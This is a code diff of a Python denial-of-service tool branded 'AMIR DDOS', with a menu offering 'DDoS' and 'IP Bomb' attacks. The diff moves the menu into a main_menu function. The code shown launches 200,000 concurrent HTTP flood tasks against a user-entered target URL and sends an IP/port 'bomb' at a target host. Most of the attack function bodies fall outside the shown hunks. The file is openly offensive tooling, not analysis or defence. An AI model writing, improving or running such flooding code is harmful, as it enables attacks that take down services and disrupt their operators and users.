@@ -1,3 +1,5 @@
+import time
+
 import aiohttp
 import asyncio
 import sys
@@ -6,26 +8,10 @@ from colorama import Fore
 import os 
 from pystyle import *
 import socket
+import time
 
 colorama.init(convert=True, autoreset=True)
 
-
-os.system('cls') if os.name == 'nt' else os.system('clear')
-print(f"""
-
-{Fore.RED}░█████╗░███╗░░░███╗██╗██████╗░  ██████╗░██████╗░░█████╗░░██████╗
-{Fore.RED}██╔══██╗████╗░████║██║██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
-{Fore.RED}███████║██╔████╔██║██║██████╔╝  ██║░░██║██║░░██║██║░░██║╚█████╗░
-{Fore.RED}██╔══██║██║╚██╔╝██║██║██╔══██╗  ██║░░██║██║░░██║██║░░██║░╚═══██╗
-{Fore.RED}██║░░██║██║░╚═╝░██║██║██║░░██║  ██████╔╝██████╔╝╚█████╔╝██████╔╝
-{Fore.RED}╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
-{Fore.RESET}                                                                                 
-
-""")
-webhook = ""
-print(f"{Fore.RED} [1] DDoS{Fore.RESET}")
-print(f"{Fore.RED} [2] IP Bomb{Fore.RESET}")
-choice = input('==> ')
 
 packets = 0
 fetches = 0
@@ -64,14 +50,40 @@ async def main():
         tasks = [flood(session, url) for _ in range(200000)] 
         await asyncio.gather(*tasks)
         
-if choice not in ['1', '2']:
-    print(f"{Fore.RED}Invalid choice. Please select either 1 or 2.{Fore.RESET}")
-    sys.exit(1)
-    
-if int(choice) == 1:
-    url = str(input('Target URL >> '))
-    asyncio.run(main())
-elif int(choice) == 2:
-    ip = str(input('Target IP >> '))
-    port = int(input('Port >> '))
-    ipbomb(ip, port)
+
+def main_menu():
+    global url
+
+    os.system('cls') if os.name == 'nt' else os.system('clear')
+    print(f"""
+
+    {Fore.RED}░█████╗░███╗░░░███╗██╗██████╗░  ██████╗░██████╗░░█████╗░░██████╗
+    {Fore.RED}██╔══██╗████╗░████║██║██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
+    {Fore.RED}███████║██╔████╔██║██║██████╔╝  ██║░░██║██║░░██║██║░░██║╚█████╗░
+    {Fore.RED}██╔══██║██║╚██╔╝██║██║██╔══██╗  ██║░░██║██║░░██║██║░░██║░╚═══██╗
+    {Fore.RED}██║░░██║██║░╚═╝░██║██║██║░░██║  ██████╔╝██████╔╝╚█████╔╝██████╔╝
+    {Fore.RED}╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
+    {Fore.RESET}                                                                                 
+
+    """)
+    print(f"{Fore.RED} [1] DDoS{Fore.RESET}")
+    print(f"{Fore.RED} [2] IP Bomb{Fore.RESET}")
+    choice = input('==> ')
+
+    if choice not in ['1', '2']:
+        print(f"{Fore.RED}Invalid choice. Please select either 1 or 2.{Fore.RESET}")
+        time.sleep(1)
+        main_menu()
+
+    if int(choice) == 1:
+        url = str(input('Target URL >> '))
+        asyncio.run(main())
+
+    elif int(choice) == 2:
+        ip = str(input('Target IP >> '))
+        port = int(input('Port >> '))
+        ipbomb(ip, port)
+
+if __name__ == "__main__":
+    main_menu()
+
